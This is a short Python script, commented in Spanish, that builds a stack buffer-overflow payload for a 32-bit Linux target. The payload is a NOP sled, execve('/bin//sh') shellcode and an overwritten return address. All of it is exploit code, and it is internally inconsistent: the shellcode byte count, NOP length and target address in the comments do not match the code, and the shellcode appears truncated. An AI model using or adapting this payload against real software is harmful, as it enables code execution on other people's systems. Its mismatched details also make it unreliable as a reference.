import sys

# Shellcode para execve("/bin//sh") - 24 bytes
shellcode = (b"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xc0")

# Relleno NOP (140 - 24 = 116 bytes)
# Usamos todo el relleno NOP para el sled.
NOP_sled_len = 100 

# EIP Target: 0xffffce70 (Una zona segura en el centro del NOP Sled. Estabilidad es la clave)
EIP_target = b"\xc0\xcd\xff\xff" 

# Payload: NOPs (116) + Shellcode (24) + EIP (4)
payload = b"\x90" * NOP_sled_len + shellcode + b"\x90" * 12 + EIP_target

sys.stdout.buffer.write(payload)
